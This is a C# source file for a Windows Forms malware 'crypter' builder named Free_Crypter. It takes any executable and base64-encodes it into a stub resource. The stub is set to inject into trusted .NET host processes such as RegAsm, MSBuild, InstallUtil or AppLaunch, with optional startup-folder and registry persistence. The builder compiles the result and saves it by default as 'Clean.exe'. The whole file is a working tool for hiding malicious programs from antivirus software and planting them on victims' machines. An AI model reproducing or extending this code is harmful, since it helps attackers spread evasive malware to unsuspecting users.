using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using MaterialSkin;
using MaterialSkin.Controls;
using System.IO;

namespace Free_Crypter
{
    public partial class Form1 : MaterialForm
    {
        public Form1()
        {
            InitializeComponent();
            this.Sizable = false;
            var SkinManager = MaterialSkinManager.Instance;
            SkinManager.Theme = MaterialSkinManager.Themes.DARK;
            SkinManager.ColorScheme = new ColorScheme(Primary.BlueGrey700, Primary.BlueGrey800, Primary.BlueGrey400, Accent.Red400, TextShade.WHITE);
            SkinManager.EnforceBackcolorOnAllComponents = true;
            SkinManager.AddFormToManage(this);
        }

        private void btnBrowse_Click(object sender, EventArgs e)
        {
            using(OpenFileDialog OFD = new OpenFileDialog())
            {
                OFD.Filter = "Executable File | *.exe";
                OFD.Title = "Select File";
                if (OFD.ShowDialog() == DialogResult.OK)
                {
                    txtFilePath.Text = OFD.FileName;
                    lblFileSize.Text = $"File Length: {File.ReadAllBytes(OFD.FileName).Length.ToString()} Bytes";
                }
            }
        }

        private void btnCrypt_Click(object sender, EventArgs e)
        {
            string InjectionProcess = "RegAsm.exe";
            if (rbRegAsm.Checked == true)
            {
                InjectionProcess = "RegAsm.exe";
            }
            else if (rbMSBuild.Checked == true)
            {
                InjectionProcess = "MSBuild.exe";
            }
            else if (rbInstallUtil.Checked == true)
            {
                InjectionProcess = "InstallUtil.exe";
            }
            else if (rbAppLaunch.Checked == true)
            {
                InjectionProcess = "AppLaunch.exe";
            }

            string PayloadToBase64 = Convert.ToBase64String(File.ReadAllBytes(txtFilePath.Text));
            string Stub = Properties.Resources.Stub.Replace("%PayloadBase64%", PayloadToBase64).Replace("%Process%", InjectionProcess).Replace("%Startup%", cbStartup.Checked.ToString()).Replace("%Filename%", txtStartupFile.Text).Replace("%Registry%", cbRegistry.Checked.ToString()).Replace("%RegName%", txtRegistryName.Text);
            using(SaveFileDialog SFD = new SaveFileDialog())
            {
                SFD.Filter = "Executable File | *.exe";
                SFD.FileName = "Clean.exe";
                SFD.Title = "Save File";
                if (SFD.ShowDialog() == DialogResult.OK)
                {
                    CodeDom.Compile(SFD.FileName, Stub);
                    MessageBox.Show("File Crypted Successfully.", "File Crypted", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
            }
        }
    }
}
